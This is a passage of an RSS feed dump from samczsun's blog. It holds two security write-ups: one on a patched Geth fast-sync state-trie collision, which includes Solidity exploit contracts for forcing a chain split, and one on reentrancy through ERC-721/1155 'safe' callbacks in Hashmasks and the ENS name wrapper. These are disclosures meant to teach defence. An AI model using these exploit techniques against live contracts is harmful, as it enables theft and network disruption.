interesting bug which gave an attacker the ability to set a booby trap on the Ethereum network and detonate it whenever they liked, causing all fast-synced Geth nodes to fork off mainnet. It relied on extremely complex internal logic within Geth&apos;s synchronization and data storage code, which may explain why it went unnoticed for so long.</p><p>Tune in later for the third and final (for now, at least) installment in this series, where we&apos;ll be exploring a bug in Geth that&apos;s so new, the details are still embargoed at the time of writing.</p><hr><p><sup>1</sup> Technically, value nodes in Geth don&apos;t contain a suffix. Instead, you can think of it like an extension node followed by a value node (which just contains the raw data).</p><p><sup>2</sup> In reality Geth uses what it calls a &quot;secure trie&quot; which just hashes all keys using the SHA-3 algorithm in order to ensure all keys are always a fixed length.</p>","content:encodedSnippet":"This is the second in a series of blog posts about bugs I've found in go-ethereum (Geth). If you haven't already, take a look at Part 1 here.\nToday's post is about a bug in Geth's state downloader which could be used to trick it into syncing with mainnet incorrectly. If exploited, an attacker could have booby trapped the Ethereum blockchain and triggered a hard fork at will.\nSynchronization\nWhenever someone wants to run an Ethereum node, they must first synchronize with the network. This means downloading or computing all of the data needed to build a complete picture of the chain state at the latest block. Depending on the needs of the user, some tradeoffs between security and speed can be made, so Geth supported (at the time) two different sync modes: full sync and fast sync.\nAs the name would suggest, full sync performs a full synchronization of the Ethereum blockchain. This means that Geth will download and validate the proof-of-work seals on every single block. Geth will also execute every single transaction in the block, which allows it to generate the blockchain state locally without needing to trust other nodes. This is more secure but comes with a heavy speed tradeoff, as a full Geth sync may take anywhere from days to weeks to complete.\nHowever, some users may not want to wait weeks for a full sync to complete. Perhaps they have a deadline to meet or they simply don't think the speed tradeoff is worth it. For this, Geth offers a mode where chain data up to a recent block (known as the pivot) is synchronized using a faster approach, with only the few remaining blocks being synchronized using the slower full sync algorithm. In fast sync mode, Geth downloads but does not verify the proof-of-work on every block, instead choosing certain blocks at random. Geth also does not execute any transactions, instead choosing to download the state trie directly from peers in order to arrive at the final blockchain state.\nOf course, Geth doesn't just blindly trust state trie data that peers send back, or a malicious peer could claim that a certain account has much more ether than it actually does. To understand how Geth can tell whether the data it just received is correct or not, we must first understand the Merkle-Patricia trie.\nMerkle-Patricia Trie\nThe Merkle-Patricia trie (MPT) is a key data structure in Geth and is a combination of the Merkle tree and the Patricia trie.\nPut very simply, a Patricia trie stores data in a tree-like structure based on the data's prefix. This is a more optimal way of storing similar data when compared to something like a hashmap, although there may be a speed tradeoff. For example, here's how several words all starting with r might be stored in a Patricia trie.\nBy Claudio Rocchini - Own work, CC BY 2.5, https://commons.wikimedia.org/w/index.php?curid=2118795\nMeanwhile, a Merkle tree is simply a tree where the leaf nodes are hashes of the data and all other nodes are hashes of their children. If a user knows the Merkle root (i.e. the top hash) of the Merkle tree and wants to check whether a specific piece of data was contained in the tree, they can do so using only a path through the tree, which is proportional to the log of the number of leaf nodes, rather than the number of leaf nodes itself. In the diagram below, a user can prove that L2 is a member of the tree by providing Hash 0-0 and Hash 1. The verifier will then generate Hash 0-1, Hash 0, and Top Hash which can be compared with the Merkle root they expected.\nBy Azaghal - Own work, CC0, https://commons.wikimedia.org/w/index.php?curid=18157888\nWith a MPT, the prefix-based storage layout of the Patricia trie is combined with the Merkle tree to create a data structure whose contents can be cryptographically verified while still maintaining good runtime performance.\nIn the MPT, keys and values are arbitrary byte strings. To retrieve the value for a key, the key is first converted into a sequence of hexadecimal characters such that every byte becomes two hex characters. Then, the root node is consulted to determine what the next node should be for the first character in the sequence. The child node is then consulted for the second character, and the process repeats until the final node is found for the final character in the sequence.\nIn the example below, we see there are actually three different types of nodes in the MPT. An extension node (or, a short node, as it's referred to in the Geth codebase) is an optimization which states that the given node is responsible for multiple characters in the stream. In this case, the root node covers all keys which begin with a7, removing the need for two distinct nodes to represent a and 7. A branch node (or a full node) contains pointers for every possible character as well as one extra slot for the value at the current node. Finally, a leaf node (or a value node) indicates that the given node must match until the end of the key1.\nBy Lee Thomas\nState Trie\nNow that we know how the Merkle-Patricia trie works, we can examine the global state trie itself.\nThe global state trie is where most of the data for the blockchain is stored. Although it's convenient to imagine the state trie as a distinct entity that is unique to each block, the reality is that duplicating the entire state trie for each block would be extremely inefficient as only a small percentage of the trie changes from block to block. Instead, Geth maintains what can be imagined like a pool of MPT nodes. The state trie for each block is simply a subset of the whole pool, and as new blocks are mined or imported, new MPT nodes are inserted into the pool.\nIn order to identify the root nodes in the pool of nodes, the block header must be consulted. Every block contains a field known as the stateRoot, which points to the root node of the MPT which stores account data keyed by the account address2. This allows Geth to look up account information such as the nonce or balance for any address using the algorithm we described above.\nOriginal by Lee Thomas\nNote that for contracts, the account state will contain a non-empty storageRoot and codeHash. The storageRoot points to another root node, but this time for a MPT which stores contract storage data. This MPT is keyed on the storage slot and the value is the raw data itself.\nOriginal by Lee Thomas\nTo store the MPT on disk, Geth chose to use LevelDB as its database. However, LevelDB is a key-value datastore that only supports string-to-string mappings, and a MPT is not a string-to-string mapping. To solve this problem, Geth flattens the global state trie by writing each node as a key-value pair: the key is the hash of the node and the value is the serialized node itself. This is also how Geth is able to look up the state trie for any given block, because the stateRoot field in the block header is the key which can be used to find the serialized MPT node in LevelDB.\nTrie Confusion\nSo let's say that you're starting up a Geth node and you're connecting to the network using fast sync. Geth will quickly download all of the block data but not execute any transactions. Before long, you'll have a chain of blocks but no state information. Here, Geth kicks off the state downloader which begins synchronizing from the pivot block's stateRoot.\n\n// NewSync creates a new trie data download scheduler.\nfunc NewSync(root common.Hash, database ethdb.KeyValueReader, callback LeafCallback, bloom *SyncBloom) *Sync {\n\tts := &Sync{\n\t\tdatabase: database,\n\t\tmembatch: newSyncMemBatch(),\n\t\trequests: make(map[common.Hash]*request),\n\t\tqueue:    prque.New(nil),\n\t\tbloom:    bloom,\n\t}\n\tts.AddSubTrie(root, 0, common.Hash{}, callback)\n\treturn ts\n}\nSource\nThe state downloader will send a request to its peers for the MPT node data corresponding to the MPT node key. When it receives a result, it verifies that the node data hashes to the expected node key. If it does, then the state downloader knows that the node is correct and will process it by dispatching more requests for each child of the node.\n\n\t\t// Create and schedule a request for all the children nodes\n\t\trequests, err := s.children(request, node)\n\t\tif err != nil {\n\t\t\treturn committed, i, err\n\t\t}\n\t\tif len(requests) == 0 && request.deps == 0 {\n\t\t\ts.commit(request)\n\t\t\tcommitted = true\n\t\t\tcontinue\n\t\t}\n\t\trequest.deps += len(requests)\n\t\tfor _, child := range requests {\n\t\t\ts.schedule(child)\n\t\t}\nSource\nIf a leaf node is encountered, that is, a node which contains a serialized account state, then the account's code and state trie will be queued for fetching.\n\n\tcallback := func(leaf []byte, parent common.Hash) error {\n\t\tvar obj Account\n\t\tif err := rlp.Decode(bytes.NewReader(leaf), &obj); err != nil {\n\t\t\treturn err\n\t\t}\n\t\tsyncer.AddSubTrie(obj.Root, 64, parent, nil)\n\t\tsyncer.AddRawEntry(common.BytesToHash(obj.CodeHash), 64, parent)\n\t\treturn nil\n\t}\nSource\nNote that there's a distinction between synchronizing a sub trie and a raw entry. While both will download an arbitrary blob of data, if the syncer is expecting a raw trie then it will parse the data as a trie node and begin synchronizing its children. On the other hand, if the syncer is expecting a raw entry it will simply write the blob to the database and terminate.\n\n\t\t// If the item was not requested, bail out\n\t\trequest := s.requests[item.Hash]\n\t\tif request == nil {\n\t\t\treturn committed, i, ErrNotRequested\n\t\t}\n\t\tif request.data != nil {\n\t\t\treturn committed, i, ErrAlreadyProcessed\n\t\t}\n\t\t// If the item is a raw entry request, commit directly\n\t\tif request.raw {\n\t\t\trequest.data = item.Data\n\t\t\ts.commit(request)\n\t\t\tcommitted = true\n\t\t\tcontinue\n\t\t}\nSource\nAdditionally, note that it's not uncommon for Geth to want to request the same node multiple times. For example, two contracts might share the same stateRoot if they contain identical storage, or two accounts might share the same account state. In this case, Geth doesn't want to spam the network with spurious requests so it will merge them together.\n\nfunc (s *Sync) schedule(req *request) {\n\t// If we're already requesting this node, add a new reference and stop\n\tif old, ok := s.requests[req.hash]; ok {\n\t\told.parents = append(old.parents, req.parents...)\n\t\treturn\n\t}\n\t// Schedule the request for future retrieval\n\ts.queue.Push(req.hash, int64(req.depth))\n\ts.requests[req.hash] = req\n}\nSource\nHowever, the syncer doesn't merge the raw attribute of a request. This means that if there is already a pending raw entry request but the syncer schedules a sub trie request with the same hash, it will be merged and the end result will still be a raw entry request.\nRemember that a raw request does not process the node for children to be synced. This means that if we can somehow generate a collision between a raw node and a sub trie node, we'll be able to cause Geth to sync an incomplete state trie. Furthermore, Geth (at the time) doesn't bail out when reading from a trie node that doesn't exist, likely assuming that such a situation could never happen if the downloader reported a successful sync, meaning that a Geth node with a missing trie node would behave completely differently from any other node with a fully synchronized trie.\nSo how can we generate such a collision? It turns out to be extremely simple: all we need to do is deploy a contract whose code is equal to the serialized state root of another contract we control. Our code hash will necessarily be the same as the state root hash, which means that if our contract code is synchronized first, our other contract's state trie will never be fully downloaded.\nPutting it all Together\nFully weaponizing this vulnerability would have required multiple steps and a lot of waiting.\nFirst, we deploy a contract whose state trie will be overwritten using the exploit. This contract should have a unique stateRoot so that the MPT node associated with that stateRoot won't be synchronized earlier.\ncontract Discrepancy {\n    uint public magic = 1;\n    \n    // make sure we have a unique stateRoot\n    uint[] private filler = [1,2,3,4,5,6,7,8,9,0];\n}\nNext, we deploy another contract which will use the discrepancy to trigger a hard fork:\ncontract Hardfork {\n    function hardfork(Discrepancy target) public {\n        require(target.magic() == 0, \"no discrepancy found\");\n        \n        selfdestruct(msg.sender);\n    }\n}\nFinally, we deploy a third contract whose code will be equivalent to the state root of our Discrepancy contract. We must take care here to ensure that the address of this contract is \"smaller\" than the address of the discrepancy contract itself so that it will always be synced before the discrepancy contract.\ncontract Exploit {\n    constructor(bytes memory stateRoot) public {\n        assembly {\n            return(add(stateRoot, 0x20), mload(stateRoot))\n        }\n    }\n}\nNow we sit back and relax. As new Geth nodes join the network using fast sync, they will request the Exploit contract first which will sync its state sub trie as well as its code. When Exploit's code is synced, it will create a raw request which looks exactly identical to a request for Discrepancy's state root, except it won't be processed as a sub trie request. This means that the node will never download Discrepancy's state trie so future requests to read magic will return 0 instead of 1.\nAfter sufficient time has passed, all we need to do is call Hardfork.hardfork(discrepancy). Every node which has correctly synchronized the entire network will see a reverted transaction, while every Geth node which had joined the network using fast sync will see a successful transaction. This will result in two different state roots for that block, meaning that we just triggered a chain split at will.\nThe Geth team quickly patched this attack by properly handling trie read errors in PR #21039, then fully fixed the vulnerability by distinguishing between code blobs and trie blobs in PR #21080.\nConclusion\nThis was an extremely interesting bug which gave an attacker the ability to set a booby trap on the Ethereum network and detonate it whenever they liked, causing all fast-synced Geth nodes to fork off mainnet. It relied on extremely complex internal logic within Geth's synchronization and data storage code, which may explain why it went unnoticed for so long.\nTune in later for the third and final (for now, at least) installment in this series, where we'll be exploring a bug in Geth that's so new, the details are still embargoed at the time of writing.\n\n1 Technically, value nodes in Geth don't contain a suffix. Instead, you can think of it like an extension node followed by a value node (which just contains the raw data).\n2 In reality Geth uses what it calls a \"secure trie\" which just hashes all keys using the SHA-3 algorithm in order to ensure all keys are always a fixed length.","dc:creator":"samczsun","content":"This is how an attacker could have hid a ticking time bomb on the Ethereum blockchain that, when triggered, would hard fork the entire network","contentSnippet":"This is how an attacker could have hid a ticking time bomb on the Ethereum blockchain that, when triggered, would hard fork the entire network","guid":"60a80b1a2c41740001d6fc2f","isoDate":"2021-05-27T22:54:20.000Z","from":"https://samczsun.com/rss/","hashId":"f9e69d4ccd27097d58e8223657eb2ba6"},{"creator":"samczsun","title":"The Dangers of Surprising Code","link":"https://samczsun.com/the-dangers-of-surprising-code/","pubDate":"Fri, 13 Aug 2021 19:52:42 GMT","content:encoded":"<img src=\"https://samczsun.com/content/images/2021/08/129446413_xl.jpg\" alt=\"The Dangers of Surprising Code\"><p>If you work in software engineering, odds are you&apos;ve heard of at least one software engineering principle. While I wouldn&apos;t advocate for religiously following every principle to the letter, there are a few that are really worth paying attention to.</p><p>The one I want to talk about today is the <em>principle of least astonishment</em>. It has a fancy name but is a really simple idea. All it says is that when presented with code that claims to do something, most users will make assumptions regarding how it behaves to get that thing done. As such, your job as the developer is to write your code to match those assumptions so that your users don&apos;t get a nasty surprise.</p><p>This is a good principle to follow because developers like making assumptions about things. If you export a function called <code>calculateScore(GameState)</code>, a lot of people are going to rightly assume that the function will only read from the game state. If you also mutate the game state, you&apos;ll surprise a lot of very confused people trying to figure out why their game state is randomly getting corrupted. Even if you put it in the documentation, there&apos;s still no guarantee that people will see it, so it&apos;s best to just ensure your code isn&apos;t surprising in the first place.</p><figure class=\"kg-card kg-embed-card\"><blockquote class=\"twitter-tweet\"><p lang=\"en\" dir=\"ltr\">6 hours of debugging can save you 5 minutes of reading documentation</p>&#x2014; Jakob &#x2618;&#xFE0F; \\u0000 (@jcsrb) <a href=\"https://twitter.com/jcsrb/status/1392459191353286656?ref_src=twsrc%5Etfw\">May 12, 2021</a></blockquote>\n<script async src=\"https://platform.twitter.com/widgets.js\" charset=\"utf-8\"></script>\n</figure><h2 id=\"safer-is-better-right\">Safer Is Better, Right?</h2><p>When the ERC-721 standard was being drafted, back in the beginning of 2018, a suggestion was made to implement <a href=\"https://github.com/ethereum/EIPs/commit/74dadccc858545aa89edaf6ec1cb5857cd261083\">transfer security</a> to ensure that tokens wouldn&apos;t be stuck in recipient contracts that weren&apos;t designed to handle them. To do this, the proposal authors modified the behavior of the <code>transfer</code> function to check the recipient for whether they were capable of supporting the token transfer. They also introduced the <code>unsafeTransfer</code> function which would bypass this check, should the sender so desire.</p><p>However, due to concerns about backwards compatibility, the functions were <a href=\"https://github.com/ethereum/EIPs/commit/2bddd126def7c046e1e62408dc2b51bdd9e57f0f\">renamed</a> in a subsequent commit. This made the <code>transfer</code> function behave the same for both an ERC-20 and an ERC-721 token. However, now the recipient checking needed to be moved elsewhere. As such, the <code>safe</code> class of functions was introduced: <code>safeTransfer</code> and <code>safeTransferFrom</code>.</p><p>This was a solution for a legitimate problem, as there have been numerous examples of ERC-20 tokens being accidentally transferred to contracts that never expected to receive tokens (one particularly common mistake was to transfer tokens to the token contract itself, locking it forever). It&apos;s no surprise then that when the ERC-1155 standard was being drafted, it took inspiration from the ERC-721 standard by including recipient checks not only on transfer but on mint as well.</p><p>These standards mostly sat dormant for the next few years while ERC-20 maintained its popularity, but recently a spike in gas costs as well as interest in NFTs means that the ERC-721 and ERC-1155 standards have seen a spike in developer usage. With all this renewed interest, it sure is fortunate that these standards were designed with safety in mind, right?</p><h1 id=\"safer-is-better-right-1\"><em>Safer Is Better, Right?</em></h1><p>Ok, but what exactly does it mean for a transfer or mint to be safe? Different parties have different interpretations of safety. For a developer, a safe function might mean that it doesn&apos;t contain any bugs or introduce additional security concerns. For a user, it could mean that it contains additional guardrails to protect them from accidentally shooting themselves in the foot.</p><p>It turns out that in this case, these functions are more of the latter and less of the former. This is especially unfortunate because given the choice between <code>transfer</code> and <code>safeTransfer</code>, why wouldn&apos;t you pick the safe one? It&apos;s in the name!</p><p>Well, one reason might be our old friend reentrancy, or as I&apos;ve been trying my hardest to rebrand it to: unsafe external calls. Recall that any external call is potentially unsafe if the recipient is attacker-controlled because the attacker may be able to cause your contract to transition into an undefined state. By design, these &quot;safe&quot; functions perform an external call to the recipient of the tokens, which is often controlled by the sender during a mint or transfer. In other words, this is practically a textbook example of an unsafe external call.</p><p>But, you might ask yourself, what&apos;s the worst that could happen from allowing a recipient contract to reject a transfer that they weren&apos;t able to process? Well, allow me to answer that question with two quick case studies.</p><h2 id=\"hashmasks\">Hashmasks</h2><p>Hashmasks are NFTs with a limited supply. Users were able to purchase up to 20 masks per transaction, although they&apos;ve been sold out for months already. Here&apos;s the function to buy masks:</p><pre><code class=\"language-solidity\">function mintNFT(uint256 numberOfNfts) public payable {\n    require(totalSupply() &lt; MAX_NFT_SUPPLY, &quot;Sale has already ended&quot;);\n    require(numberOfNfts &gt; 0, &quot;numberOfNfts cannot be 0&quot;);\n    require(numberOfNfts &lt;= 20, &quot;You may not buy more than 20 NFTs at once&quot;);\n    require(totalSupply().add(numberOfNfts) &lt;= MAX_NFT_SUPPLY, &quot;Exceeds MAX_NFT_SUPPLY&quot;);\n    require(getNFTPrice().mul(numberOfNfts) == msg.value, &quot;Ether value sent is not correct&quot;);\n\n    for (uint i = 0; i &lt; numberOfNfts; i++) {\n        uint mintIndex = totalSupply();\n        if (block.timestamp &lt; REVEAL_TIMESTAMP) {\n            _mintedBeforeReveal[mintIndex] = true;\n        }\n        _safeMint(msg.sender, mintIndex);\n    }\n\n    /**\n    * Source of randomness. Theoretical miner withhold manipulation possible but should be sufficient in a pragmatic sense\n    */\n    if (startingIndexBlock == 0 &amp;&amp; (totalSupply() == MAX_NFT_SUPPLY || block.timestamp &gt;= REVEAL_TIMESTAMP)) {\n        startingIndexBlock = block.number;\n    }\n}</code></pre><p>If you weren&apos;t expecting it, then this function might seem perfectly reasonable. However, as you might have predicted, there&apos;s something sinister hidden inside that <code>_safeMint</code> call. Let&apos;s take a look.</p><pre><code class=\"language-solidity\">    function _safeMint(address to, uint256 tokenId, bytes memory _data) internal virtual {\n        _mint(to, tokenId);\n        require(_checkOnERC721Received(address(0), to, tokenId, _data), &quot;ERC721: transfer to non ERC721Receiver implementer&quot;);\n    }</code></pre><p>For <em>safety</em>, this function performs a callback to the recipient of the token to check that they&apos;re willing to accept the transfer. However, we&apos;re the recipient of the token, which means we just got a callback at which point we can do whatever we like, including calling <code>mintNFT</code> again. If we do this, we&apos;ll reenter the function after only one mask has been minted, which means we can request to mint another 19 masks. This results in a total of 39 masks being minted, even though the maximum allowable was only 20.</p><h1 id=\"ens-name-wrapper\">ENS Name Wrapper</h1><p>More recently, Nick Johnson from ENS reached out about taking a look at their work-in-progress name wrapper for the ENS. The name wrapper allows users to tokenize their ENS domains in a new ERC-1155 token which provides support for fine-grained permissions and a more consistent API.</p><p>At a high level, in order to wrap an arbitrary ENS domain (more specifically, any domain that isn&apos;t a 2LD <code>.eth</code> domain) you must first approve the name wrapper to access your ENS domain. Then you call <code>wrap(bytes,address,uint96,address)</code> which both mints an ERC-1155 token for you and also takes custody of the underlying ENS domain.</p><p>Here&apos;s the wrap function itself, it&apos;s fairly straightforward. First, we call <code>_wrap</code> which does some logic and returns the hashed domain name. Then we ensure that the transaction sender is indeed the owner of the ENS domain before taking custody of the domain. Note that if the sender does not own the underlying ENS domain, then the entire transaction should revert, undoing any changes made in <code>_wrap</code>.</p><pre><code class=\"language-solidity\">    function wrap(\n        bytes calldata name,\n        address wrappedOwner,\n        uint96 _fuses,\n        address resolver\n    ) public override {\n        bytes32 node = _wrap(name, wrappedOwner, _fuses);\n        address owner = ens.owner(node);\n\n        require(\n            owner == msg.sender ||\n                isApprovedForAll(owner, msg.sender) ||\n                ens.isApprovedForAll(owner, msg.sender),\n            &quot;NameWrapper: Domain is not owned by the sender&quot;\n        );\n        ens.setOwner(node, address(this));\n        if (resolver != address(0)) {\n            ens.setResolver(node, resolver);\n        }\n    }</code></pre><p>Here&apos;s the <code>_wrap</code> function itself. Nothing special going on in here.</p><pre><code class=\"language-solidity\">    function _wrap(\n        bytes memory name,\n        address wrappedOwner,\n        uint96 _fuses\n    ) private returns (bytes32 node) {\n        (bytes32 labelhash, uint256 offset) = name.readLabel(0);\n        bytes32 parentNode = name.namehash(offset);\n\n        require(\n            parentNode != ETH_NODE,\n            &quot;NameWrapper: .eth domains need to use wrapETH2LD()&quot;\n        );\n\n        node = _makeNode(parentNode, labelhash);\n\n        _mint(node, name, wrappedOwner, _fuses);\n        emit NameWrapped(node, name, wrappedOwner, _fuses);\n    }</code></pre><p>Unfortunately, it&apos;s the <code>_mint</code> function itself where unsuspecting developers may be in for a nasty surprise. The ERC-1155 specification states that when minting a token, the recipient should be consulted for whether they&apos;re willing to accept the token. Upon digging into the library code (which is lightly modified from the OpenZeppelin base), we see that this is indeed the case.</p><pre><code class=\"language-solidity\">    function _mint(\n        bytes32 node,\n        bytes memory name,\n        address wrappedOwner,\n        uint96 _fuses\n    ) internal {\n        names[node] = name;\n\n        address oldWrappedOwner = ownerOf(uint256(node));\n        if (oldWrappedOwner != address(0)) {\n            // burn and unwrap old token of old owner\n            _burn(uint256(node));\n            emit NameUnwrapped(node, address(0));\n        }\n        _mint(node, wrappedOwner, _fuses);\n    }\n    \n    function _mint(\n        bytes32 node,\n        address newOwner,\n        uint96 _fuses\n    ) internal virtual {\n        uint256 tokenId = uint256(node);\n        address owner = ownerOf(tokenId);\n        require(owner == address(0), &quot;ERC1155: mint of existing token&quot;);\n        require(newOwner != address(0), &quot;ERC1155: mint to the zero address&quot;);\n        require(\n            newOwner != address(this),\n            &quot;ERC1155: newOwner cannot be the NameWrapper contract&quot;\n        );\n        _setData(tokenId, newOwner, _fuses);\n        emit TransferSingle(msg.sender, address(0x0), newOwner, tokenId, 1);\n        _doSafeTransferAcceptanceCheck(\n            msg.sender,\n            address(0),\n            newOwner,\n            tokenId,\n            1,\n            &quot;&quot;\n        );\n    }</code></pre><p>But what good does this do for us, exactly? Well, once again we are presented with an unsafe external call that we can use to perform reentrancy. Specifically, notice that during the callback we own the ERC-1155 token representing the ENS domain, but the name wrapper hasn&apos;t yet verified that we own the underlying ENS domain itself. This allows us to operate on the ENS domain without actually owning it in the first place. For example, we can ask the name wrapper to unwrap our domain, burning the token we just minted and getting the underlying ENS domain.</p><pre><code class=\"language-solidity\">    function unwrap(\n        bytes32 parentNode,\n        bytes32 label,\n        address newController\n    ) public override onlyTokenOwner(_makeNode(parentNode, label)) {\n        require(\n            parentNode != ETH_NODE,\n            &quot;NameWrapper: .eth names must be unwrapped with unwrapETH2LD()&quot;\n        );\n        _unwrap(_makeNode(parentNode, label), newController);\n    }\n    \n    function _unwrap(bytes32 node, address newOwner) private {\n        require(\n            newOwner != address(0x0),\n            &quot;NameWrapper: Target owner cannot be 0x0&quot;\n        );\n        require(\n            newOwner != address(this),\n            &quot;NameWrapper: Target owner cannot be the NameWrapper contract&quot;\n        );\n        require(\n            !allFusesBurned(node, CANNOT_UNWRAP),\n            &quot;NameWrapper: Domain is not unwrappable&quot;\n        );\n\n        // burn token and fuse data\n        _burn(uint256(node));\n        ens.setOwner(node, newOwner);\n\n        emit NameUnwrapped(node, newOwner);\n    }</code></pre><p>Now that we have the underlying ENS domain, we can do whatever we want with it, such as register new subdomains or set the resolver. When we&apos;re done, we just exit the callback. The name wrapper will fetch the current owner of the underlying ENS domain, which is us, and complete the transaction. Just like that, we&apos;ve taken temporary ownership of any ENS domain the name wrapper is approved for and made arbitrary changes to it.</p><h1 id=\"conclusion\">Conclusion</h1><p>Code that&apos;s surprising may break things in catastrophic ways. In both of these cases, developers who reasonably assumed that the <code>safe</code> class of functions would be (at least as) safe to use instead inadvertently increased their attack surface. As the ERC-721 and ERC-1155 standards become more popular and widespread, it is very likely that this will become an increasingly frequent occurrence. Developers will need to consider the risks of using the <code>safe</code> class of functions and determine how the external call might interact with the code they&apos;ve written.</p>","content:encodedSnippet":"If you work in software engineering, odds are you've heard of at least one software engineering principle. While I wouldn't advocate for religiously following every principle to the letter, there are a few that are really worth paying attention to.\nThe one I want to talk about today is the principle of least astonishment. It has a fancy name but is a really simple idea. All it says is that when presented with code that claims to do something, most users will make assumptions regarding how it behaves to get that thing done. As such, your job as the developer is to write your code to match those assumptions so that your users don't get a nasty surprise.\nThis is a good principle to follow because developers like making assumptions about things. If you export a function called calculateScore(GameState), a lot of people are going to rightly assume that the function will only read from the game state. If you also mutate the game state, you'll surprise a lot of very confused people trying to figure out why their game state is randomly getting corrupted. Even if you put it in the documentation, there's still no guarantee that people will see it, so it's best to just ensure your code isn't surprising in the first place.\n\n6 hours of debugging can save you 5 minutes of reading documentation\n— Jakob ☘️ \\u0000 (@jcsrb) May 12, 2021\n\n\nSafer Is Better, Right?\nWhen the ERC-721 standard was being drafted, back in the beginning of 2018, a suggestion was made to implement transfer security to ensure that tokens wouldn't be stuck in recipient contracts that weren't designed to handle them. To do this, the proposal authors modified the behavior of the transfer function to check the recipient for whether they were capable of supporting the token transfer. They also introduced the unsafeTransfer function which would bypass this check, should the sender so desire.\nHowever, due to concerns about backwards compatibility, the functions were renamed in a subsequent commit. This made the transfer function behave the same for both an ERC-20 and an ERC-721 token. However, now the recipient checking needed to be moved elsewhere. As such, the safe class of functions was introduced: safeTransfer and safeTransferFrom.\nThis was a solution for a legitimate problem, as there have been numerous examples of ERC-20 tokens being accidentally transferred to contracts that never expected to receive tokens (one particularly common mistake was to transfer tokens to the token contract itself, locking it forever). It's no surprise then that when the ERC-1155 standard was being drafted, it took inspiration from the ERC-721 standard by including recipient checks not only on transfer but on mint as well.\nThese standards mostly sat dormant for the next few years while ERC-20 maintained its popularity, but recently a spike in gas costs as well as interest in NFTs means that the ERC-721 and ERC-1155 standards have seen a spike in developer usage. With all this renewed interest, it sure is fortunate that these standards were designed with safety in mind, right?\nSafer Is Better, Right?\nOk, but what exactly does it mean for a transfer or mint to be safe? Different parties have different interpretations of safety. For a developer, a safe function might mean that it doesn't contain any bugs or introduce additional security concerns. For a user, it could mean that it contains additional guardrails to protect them from accidentally shooting themselves in the foot.\nIt turns out that in this case, these functions are more of the latter and less of the former. This is especially unfortunate because given the choice between transfer and safeTransfer, why wouldn't you pick the safe one? It's in the name!\nWell, one reason might be our old friend reentrancy, or as I've been trying my hardest to rebrand it to: unsafe external calls. Recall that any external call is potentially unsafe if the recipient is attacker-controlled because the attacker may be able to cause your contract to transition into an undefined state. By design, these \"safe\" functions perform an external call to the recipient of the tokens, which is often controlled by the sender during a mint or transfer. In other words, this is practically a textbook example of an unsafe external call.\nBut, you might ask yourself, what's the worst that could happen from allowing a recipient contract to reject a transfer that they weren't able to process? Well, allow me to answer that question with two quick case studies.\nHashmasks\nHashmasks are NFTs with a limited supply. Users were able to purchase up to 20 masks per transaction, although they've been sold out for months already. Here's the function to buy masks:\nfunction mintNFT(uint256 numberOfNfts) public payable {\n    require(totalSupply() < MAX_NFT_SUPPLY, \"Sale has already ended\");\n    require(numberOfNfts > 0, \"numberOfNfts cannot be 0\");\n    require(numberOfNfts <= 20, \"You may not buy more than 20 NFTs at once\");\n    require(totalSupply().add(numberOfNfts) <= MAX_NFT_SUPPLY, \"Exceeds MAX_NFT_SUPPLY\");\n    require(getNFTPrice().mul(numberOfNfts) == msg.value, \"Ether value sent is not correct\");\n\n    for (uint i = 0; i < numberOfNfts; i++) {\n        uint mintIndex = totalSupply();\n        if (block.timestamp < REVEAL_TIMESTAMP) {\n            _mintedBeforeReveal[mintIndex] = true;\n        }\n        _safeMint(msg.sender, mintIndex);\n    }\n\n    /**\n    * Source of randomness. Theoretical miner withhold manipulation possible but should be sufficient in a pragmatic sense\n    */\n    if (startingIndexBlock == 0 && (totalSupply() == MAX_NFT_SUPPLY || block.timestamp >= REVEAL_TIMESTAMP)) {\n        startingIndexBlock = block.number;\n    }\n}\nIf you weren't expecting it, then this function might seem perfectly reasonable. However, as you might have predicted, there's something sinister hidden inside that _safeMint call. Let's take a look.\n    function _safeMint(address to, uint256 tokenId, bytes memory _data) internal virtual {\n        _mint(to, tokenId);\n        require(_checkOnERC721Received(address(0), to, tokenId, _data), \"ERC721: transfer to non ERC721Receiver implementer\");\n    }\nFor safety, this function performs a callback to the recipient of the token to check that they're willing to accept the transfer. However, we're the recipient of the token, which means we just got a callback at which point we can do whatever we like, including calling mintNFT again. If we do this, we'll reenter the function after only one mask has been minted, which means we can request to mint another 19 masks. This results in a total of 39 masks being minted, even though the maximum allowable was only 20.\nENS Name Wrapper\nMore recently, Nick Johnson from ENS reached out about taking a look at their work-in-progress name wrapper for the ENS. The name wrapper allows users to tokenize their ENS domains in a new ERC-1155 token which provides support for fine-grained permissions and a more consistent API.\nAt a high level, in order to wrap an arbitrary ENS domain (more specifically, any domain that isn't a 2LD .eth domain) you must first approve the name wrapper to access your ENS domain. Then you call wrap(bytes,address,uint96,address) which both mints an ERC-1155 token for you and also takes custody of the underlying ENS domain.\nHere's the wrap function itself, it's fairly straightforward. First, we call _wrap which does some logic and returns the hashed domain name. Then we ensure that the transaction sender is indeed the owner of the ENS domain before taking custody of the domain. Note that if the sender does not own the underlying ENS domain, then the entire transaction should revert, undoing any changes made in _wrap.\n    function wrap(\n        bytes calldata name,\n        address wrappedOwner,\n        uint96 _fuses,\n        address resolver\n    ) public override {\n        bytes32 node = _wrap(name, wrappedOwner, _fuses);\n        address owner = ens.owner(node);\n\n        require(\n            owner == msg.sender ||\n                isApprovedForAll(owner, msg.sender) ||\n                ens.isApprovedForAll(owner, msg.sender),\n            \"NameWrapper: Domain is not owned by the sender\"\n        );\n        ens.setOwner(node, address(this));\n        if (resolver != address(0)) {\n            ens.setResolver(node, resolver);\n        }\n    }\nHere's the _wrap function itself. Nothing special going on in here.\n    function _wrap(\n        bytes memory name,\n        address wrappedOwner,\n        uint96 _fuses\n    ) private returns (bytes32 node) {\n        (bytes32 labelhash, uint256 offset) = name.readLabel(0);\n        bytes32 parentNode = name.namehash(offset);\n\n        require(\n            parentNode != ETH_NODE,\n            \"NameWrapper: .eth domains need to use wrapETH2LD()\"\n        );\n\n        node = _makeNode(parentNode, labelhash);\n\n        _mint(node, name, wrappedOwner, _fuses);\n        emit NameWrapped(node, name, wrappedOwner, _fuses);\n    }\nUnfortunately, it's the _mint function itself where unsuspecting developers may be in for a nasty surprise. The ERC-1155 specification states that when minting a token, the recipient should be consulted for whether they're willing to accept the token. Upon digging into the library code (which is lightly modified from the OpenZeppelin base), we see that this is indeed the case.\n    function _mint(\n        bytes32 node,\n        bytes memory name,\n        address wrappedOwner,\n        uint96 _fuses\n    ) internal {\n        names[node] = name;\n\n        address oldWrappedOwner = ownerOf(uint256(node));\n        if (oldWrappedOwner != address(0)) {\n            // burn and 